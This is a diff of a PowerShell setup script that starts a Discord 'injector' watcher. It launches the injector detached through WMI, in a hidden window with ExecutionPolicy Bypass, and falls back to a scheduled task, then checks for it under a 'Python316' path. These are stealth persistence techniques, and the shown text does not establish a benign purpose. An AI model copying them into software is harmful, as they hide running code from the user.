@@ -160,10 +160,20 @@ if (-not $NoStartNow) {
     }
 
     Say 'Starting the watcher (attaches / restarts Discord once if needed)...' 'Cyan'
-    if ($registered) {
+
+    # Start detached through WMI so it is not tied to this console/job and survives setup exit.
+    $cmdLine = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $dstInjector + '"'
+    $started = $false
+    try {
+        $res = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $cmdLine }
+        if ($res.ReturnValue -eq 0) { $started = $true }
+    } catch {}
+
+    if (-not $started) {
         try { Start-ScheduledTask -TaskName $TaskName } catch { Say "  task start failed ($($_.Exception.Message))" 'Yellow' }
-        Start-Sleep -Seconds 2
+        Start-Process -FilePath $psExe -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector) -WindowStyle Hidden | Out-Null
     }
+    Start-Sleep -Seconds 2
 
     $alive = (Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -match 'injector\.ps1' -and $_.CommandLine -match 'Python316' } | Measure-Object).Count -gt 0
